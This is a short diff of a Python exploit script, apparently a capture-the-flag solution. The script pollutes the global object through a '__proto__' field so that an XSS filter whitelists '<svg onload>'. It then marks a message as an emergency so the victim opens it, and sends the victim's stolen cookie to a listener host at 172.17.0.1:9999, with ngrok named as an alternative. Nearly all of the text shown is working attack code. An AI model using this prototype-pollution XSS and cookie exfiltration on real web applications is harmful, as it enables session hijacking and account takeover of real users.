@@ -1,9 +1,8 @@
 import requests
 
-# insert your attacker controlled host here that is currently listening
-# also possible to use a service such as ngrok to receive the stolen cookie
-HOST = "http://localhost:9999"
-
+# start a listener and insert the host here to receive the stolen cookie.
+# also possible to use a service such as ngrok if desired
+HOST = "http://172.17.0.1:9999"
 
 # html encode every character in a provided string
 def html_encode(string):
@@ -24,7 +23,7 @@ payload = f"<svg onload={payload}>"
 # use the __proto__ field to pollute the global object and add svg/onload
 # to the allowed tags whitelist so that the XSS filter doesn't escape it.
 # also set emergency to true so that the hero views the message and triggers
-# the XSS which steals the cookie
+# the XSS which steals his cookie
 data = {
         "__proto__": {"whiteList": {"svg": ["onload"]}},
         "emergency": True, 
